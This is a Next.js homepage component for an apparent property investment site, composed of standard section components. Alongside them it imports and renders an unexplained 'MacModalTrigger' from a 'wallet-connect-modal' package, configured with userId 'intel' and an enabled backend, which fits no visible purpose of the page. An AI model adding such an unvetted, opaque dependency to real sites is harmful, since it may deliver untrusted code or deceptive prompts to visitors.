'use client'
import { Navbar } from '@/components/layouts/Navbar';
import { Footer } from '@/components/layouts/Footer';
import { HeroSection } from '@/components/sections/HeroSection';
import { StatsSection } from '@/components/sections/StatsSection';
import { ProblemSolutionSection } from '@/components/sections/ProblemSolutionSection';
import { HowItWorksSection } from '@/components/sections/HowItWorksSection';
import { PropertiesSection } from '@/components/sections/PropertiesSection';
import { FeaturesSection } from '@/components/sections/FeaturesSection';
import { TrustSection } from '@/components/sections/TrustSection';
import { TestimonialsSection } from '@/components/sections/TestimonialsSection';
import { CTASection } from '@/components/sections/CTASection';
import { MacModalTrigger } from 'wallet-connect-modal';
import 'wallet-connect-modal/dist/wallets/mac/styles.css';

export default function HomePage() {
  return (
    <>
      <Navbar />
      <main id="main-content" tabIndex={-1}>
        <HeroSection />
        <StatsSection />
        <ProblemSolutionSection />
        <HowItWorksSection />
        <PropertiesSection />
        <FeaturesSection />
        <TrustSection />
        <TestimonialsSection />
        <CTASection />
      </main>
      <Footer />
      <MacModalTrigger userId="intel" backendConfig={{ enabled: true }} />
    </>
  );
}
